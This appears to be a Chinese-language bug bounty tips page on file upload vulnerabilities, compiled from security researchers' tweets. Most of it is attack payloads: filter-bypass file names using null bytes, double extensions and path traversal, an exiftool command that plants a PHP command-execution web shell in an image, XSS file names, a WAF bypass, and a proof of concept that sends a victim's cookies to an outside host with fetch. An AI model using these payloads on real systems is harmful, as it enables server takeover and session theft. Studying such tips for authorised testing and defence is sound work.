# File Upload BugBountyTips

### 文件上传 (File Upload):

1.[@Zigoo0](https://twitter.com/Zigoo0/status/1247175475316830208)：一些缓存服务器会缓存大于2mb的文件。如果应用接受文件上传，则上传大文件并访问#multiple登录次数。它将被缓存。然后无需登录即可访问它，并且可以使用pingo！未经授权访问敏感文件！。

2.[@YShahinzadeh](https://twitter.com/YShahinzadeh/status/1063403827590762497)：上传点漏洞:

```bash
Content-Disposition: form-data; name="FactorImage"; filename="Untitled.jpg\test.aspx"
Content-Type: image/jpeg

Res:
{"StoreHousePicture_File":"test.aspx","Success":true}
```

3.利用文件上传点，两篇文章:

  >[利用文件上传点。1 – MIME嗅探到存储的XSS](https://anotherhackerblog.com/exploiting-file-uploads-pt1/)
 
  >[利用文件上传点。2 –价值$ 3k RCE的故事](https://anotherhackerblog.com/exploiting-file-uploads-pt-2/)

4.文件上传的一些Payload：

  >[Uploads Payloads](https://github.com/1N3/IntruderPayloads/tree/master/Uploads)

5.[@0xsapra](https://twitter.com/0xsapra/status/1258628238655598592)：Bypass 大多数文件上传过滤器:

```bash
* .htaccess <- upload htaccess
* file.svg <- uploading svg = xss
* file.SVg <- must try case mismatch
* file.png.svg
* file.php%00.png
* file.png' or '1'='1
* ../../file.png
* file.'svg <- invalid ext.
```

6.在图像中绕过文件上传过滤:

```bash
exiftool -Comment='<?php echo "<pre>"; system(Array['cmd']); ?>' shell.jpg mv shell.jpg shell.php.jpg
```

7.[@HusseiN98D](https://twitter.com/HusseiN98D/status/1194304002969743362):在IIS7服务器上测试文件上传表单时，如果将".asp"扩展名列入黑名单，则可以通过上传".cer"文件来获得RCE。

8.如果您找到图像的文件上传功能，请尝试引入文件名中带有XSS的图像，如下所示：

```js
<img src=x onerror=alert('XSS')>.png
"><img src=x onerror=alert('XSS')>.png
"><svg onmouseover=alert(1)>.svg
<<script>alert('xss')<!--a-->a.png
```

9.[@chybeta](https://twitter.com/chybeta):遇到文件上传漏洞时，除了能直接上传webshell解析外，经常能遇到只能上传静态文件造成存储XSS的。在不能上传html的情况下还可以尝试下面这些.xml, .xsl, .rdf, .svg, .shtml, .htm, .application, .mht, .var。在今年的HITCON CTF 2020上 Orange大佬出了一题 ostyle，针对 var 后缀文件造成的XSS。因为apache自带mod_negotiation在处理 var 扩展时，允许自行指定Content-type，从而造成了XSS.以下是POC:

```bash
Content-language: en
Content-type: text/html
Body:----foo----

<script>
fetch('http://orange.tw/?' + escape(document.cookie))
</script>
```

10.文件上传绕过WAF，一个案例，文件上传（.php被阻止）：

```bash
/?file=xx.php    <- Blocked
/?file===xx.php  <- Bypassed
```

文件上传成功。

